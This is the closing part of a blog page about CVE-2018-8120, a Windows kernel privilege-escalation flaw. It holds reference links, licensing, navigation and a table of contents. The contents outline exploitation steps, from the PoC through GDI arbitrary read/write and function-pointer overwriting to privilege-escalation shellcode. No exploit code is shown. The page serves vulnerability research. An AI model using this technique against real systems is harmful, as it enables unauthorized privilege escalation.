<p><a href="https://www.f-secure.com/weblog/archives/kasslin_AVAR2006_KernelMalware_paper.pdf" target="_blank" rel="external">https://www.f-secure.com/weblog/archives/kasslin_AVAR2006_KernelMalware_paper.pdf</a><br><a href="http://vexillium.org/dl.php?call_gate_exploitation.pdf" target="_blank" rel="external">http://vexillium.org/dl.php?call_gate_exploitation.pdf</a></p>
<p><a href="https://ti.360.net/blog/articles/analysis-of-cve-2018-8120-in-win-7-x64/" target="_blank" rel="external">https://ti.360.net/blog/articles/analysis-of-cve-2018-8120-in-win-7-x64/</a><br><a href="http://www.freebuf.com/vuls/173798.html" target="_blank" rel="external">http://www.freebuf.com/vuls/173798.html</a></p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://github.com">Let_go</a></p><p> <span>Link:  </span><a href="http://github.com/2018/08/26/CVE-2018-8120/">http://github.com/2018/08/26/CVE-2018-8120/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/03/25/CVE-2018-9568/" title="CVE-2018-9568"><span>< PreviousPost</span><br><span class="prevTitle">CVE-2018-9568</span></a><a class="nextSlogan" href="/2018/07/16/CVE-2017-16995/" title="CVE-2017-16995"><span>NextPost ></span><br><span class="nextTitle">CVE-2017-16995</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2018-8120"><span class="toc-number">1.</span> <span class="toc-text">CVE-2018-8120</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#相关信息："><span class="toc-number">1.1.</span> <span class="toc-text">相关信息：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#测试环境："><span class="toc-number">1.1.1.</span> <span class="toc-text">测试环境：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因："><span class="toc-number">1.1.2.</span> <span class="toc-text">漏洞成因：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞细节："><span class="toc-number">1.2.</span> <span class="toc-text">漏洞细节：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞验证："><span class="toc-number">1.3.</span> <span class="toc-text">漏洞验证：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc："><span class="toc-number">1.3.1.</span> <span class="toc-text">poc：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用："><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造数据："><span class="toc-number">1.4.1.</span> <span class="toc-text">构造数据：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#触发漏洞"><span class="toc-number">1.4.2.</span> <span class="toc-text">触发漏洞:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GDI任意读-写"><span class="toc-number">1.4.3.</span> <span class="toc-text">GDI任意读/写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#函数指针修改"><span class="toc-number">1.4.4.</span> <span class="toc-text">函数指针修改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权shellcode"><span class="toc-number">1.4.5.</span> <span class="toc-text">提权shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>